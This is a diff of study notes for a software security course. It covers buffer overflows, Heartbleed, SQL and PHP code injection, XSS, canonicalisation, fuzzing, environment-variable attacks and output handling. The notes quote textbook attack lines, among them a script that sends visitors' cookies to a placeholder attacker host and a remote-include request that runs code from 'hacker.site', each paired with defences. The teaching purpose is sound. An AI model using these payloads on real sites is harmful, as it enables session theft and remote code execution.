+**V5.** The four critical areas of interaction. Define input and its sources. Two concerns.
+
+Input handling, algorithm implementation, interaction with other components, output.
 Input: any data from outside the program whose value the programmer does not know when
 coding; obvious sources keyboard, mouse, files, network; indirect sources environment,
 configuration files, OS values. Concerns: size, and meaning or interpretation.
 
-**V6.** Assumption of a maximum size, fixed buffers of 512 or 1024 bytes, no check that the
+**V6.** Buffer overflow: the assumption, the consequence, why tests miss it, the fixes.
+
+Assumption of a maximum size, fixed buffers of 512 or 1024 bytes, no check that the
 input fits; the overflow compromises execution; tests use expected inputs and rarely inputs
 large enough; library routines may not limit copies. Fixes: safe copy routines, treat all
 input as dangerous, dynamic buffers or processing in buffer sized blocks, check requested
 memory against available memory, fail gracefully (blocks, discard the excess, terminate),
 check at every entry point of unknown data.
 
-**V7.** `var_outrasInfos[10]` and `var_nome[10]` sit on the stack; `my_gets` copies characters
+**V7.** The lecture C example: what overflows into what, why, what GCC prints, which flag
+reproduces the attack.
+
+`var_outrasInfos[10]` and `var_nome[10]` sit on the stack; `my_gets` copies characters
 until newline with no length check; more than 10 characters overflow into `var_nome`, so
 "Gabriel" is overwritten by the excess. A long input then triggers
 `*** stack smashing detected ***: terminated` and SIGABRT: a GCC protection detected the
 corrupted stack at function return. Reproduce the classic attack with
 `gcc -fno-stack-protector`, then read `man 7 signal`.
 
-**V8.** Binary data is assumed to be integers, floats, strings or structures, and the
+**V8.** Interpretation of input: binary versus text, Heartbleed, character sets.
+
+Binary data is assumed to be integers, floats, strings or structures, and the
 assumption must be validated as values are read (Ethernet, IP, TCP; DNS, SNMP, NFS against
 their abstract syntax). Heartbleed, OpenSSL 2014: no check of the requested length against
 the supplied data, a buffer over-read, leaked user names, passwords and private keys. Text:
@@ -2387,7 +2313,10 @@ bytes become characters through a character set (ASCII, Windows and macOS extens
 internationalisation); identify the set, then the meaning (integer, file name, URL, e-mail)
 and confirm the type, or the attacker influences the program.
 
-**V9.** A wide class of flaws from invalid handling of input where the input influences the
+**V9.** Injection attacks: definition, mechanism, where common. SQL injection example,
+input and prevention.
+
+A wide class of flaws from invalid handling of input where the input influences the
 flow of execution; common mechanism: input passed as a parameter to an auxiliary program whose
 output is used; frequent in scripting languages (Perl, PHP, Python, sh) and in web CGI
 scripts processing HTML forms. SQL injection: `$query = "SELECT * FROM suppliers WHERE name
@@ -2395,7 +2324,10 @@ scripts processing HTML forms. SQL injection: `$query = "SELECT * FROM suppliers
 and deletes the table; SQL metacharacters. Prevention: validate (escape or reject), sanitising
 functions, placeholders or SQL parameters instead of concatenation, stored procedures.
 
-**V10.** `include $path . 'functions.php'`: the script is called directly; PHP assigned
+**V10.** Code injection in PHP: the include scenario, the GET example, the two PHP features,
+the defences. Insecure deserialisation.
+
+`include $path . 'functions.php'`: the script is called directly; PHP assigned
 global variables from the HTTP request and `include` accepted remote URLs; `GET
 /calendar/embed/day.php?path=http://hacker.site/hack.txt?&cmd=ls` makes `$path` the
 attacker's URL and runs remote code with the web server's privileges. Defences: block
@@ -2406,14 +2338,20 @@ injection, format string, interpreter injection. Deserialisation: a byte stream 
 an object; accepting serialised objects from untrusted sources lets a manipulated stream run
 the attacker's logic during reconstruction, often RCE.
 
-**V11.** A guest book comment with `<script>document.location='http://hacker.web.site/
+**V11.** XSS: the cookie example, obfuscation, prevention, the nature of the flaw, the real
+target.
+
+A guest book comment with `<script>document.location='http://hacker.web.site/
 cookie.cgi?'+document.cookie</script>` sends the next visitor's cookie to the attacker, who
 impersonates them. Obfuscation with HTML entities (`&#60;&#115;...`), interpreted identically
 by the browser. Prevention: examine input, remove or escape dangerous code, validators
 translate entities before checking; sanitise output. A flaw of both input and output handling;
 the target is the next user, not the server; related to CSRF and HTTP response splitting.
 
-**V12.** Whitelisting compares with what is wanted and accepts only the valid: recommended.
+**V12.** Whitelist versus blacklist. Canonicalisation with the "/" example. The casting
+vulnerability. Fuzzing.
+
+Whitelisting compares with what is wanted and accepts only the valid: recommended.
 Blacklisting compares with known dangerous values and fails on new evasions. Usually regular
 expressions; on failure reject or sanitise. Canonicalisation: characters have several
 encodings (HTML, UTF-8); "/" has forms beyond 2F; long encodings bypassed filters (IIS,
@@ -2424,7 +2362,9 @@ Fuzzing: Barton Miller 1989, random input to find crashes; simple, cheap, assump
 finds exploitable flaws; may miss bugs needing specific conditions; used by developers and
 attackers.
 
-**V13.** Netscape's predictable random generator broke its cryptography; TCP session
+**V13.** Algorithm flaws: four historical examples. Memory and concurrency risks and defences.
+
+Netscape's predictable random generator broke its cryptography; TCP session
 hijacking through predictable initial sequence numbers; Ken Thompson 1984, a malicious
 compiler inserting invisible backdoors; the Morris Worm using the DEBUG command of sendmail.
 Memory: C's weak typing allows pointer manipulation, overflows and corrupted structures;
@@ -2433,7 +2373,10 @@ automatic management preferable. Concurrency: race conditions corrupt shared val
 synchronisation; misuse of primitives causes deadlock, which attackers trigger for DoS;
 choose primitives correctly, limit shared areas.
 
-**V14.** The OS builds the process environment (code, data, arguments, environment
+**V14.** OS interaction: environment variables and their attacks, least privilege practices,
+modularisation, chroot, file shredding.
+
+The OS builds the process environment (code, data, arguments, environment
 variables), all external input to validate; permissions by user and group, excessive access
 is dangerous. Environment variables inherited from the parent (PATH, IFS, LD_LIBRARY_PATH):
 PATH attack runs a fake `grep` from a privileged script; LD_LIBRARY_PATH loads malicious
@@ -2446,7 +2389,9 @@ view to one directory; hard to configure, escape or failure if wrong. Shredding:
 file does not erase it because of I/O buffers, file system buffers and smart controllers
 (SSDs avoid rewriting the same block); force flush and sync.
 
-**V15.** Output is binary or textual and must strictly match the expected format; users
+**V15.** Output: the common origin problem, two attacks through output, three mitigations.
+
+Output is binary or textual and must strictly match the expected format; users
 assume the trusted program generated and validated it, which fails when one user's input is
 shown to another (comments, forums) without sanitisation. Attacks: VT100 escape sequences
 reprogrammed function keys to run commands when text was viewed; XSS runs third party
@@ -2454,6 +2399,8 @@ JavaScript in the victim's browser through the browser's trust in the site. Miti
 relaying program is responsible, whitelist safe content; specify the character encoding
 explicitly (Content-Type) so the browser does not assume an insecure default; the target is
 the user or display device, not the server, but the software's reputation suffers.
+
+---
 
 ## 8. Essay skeletons
 
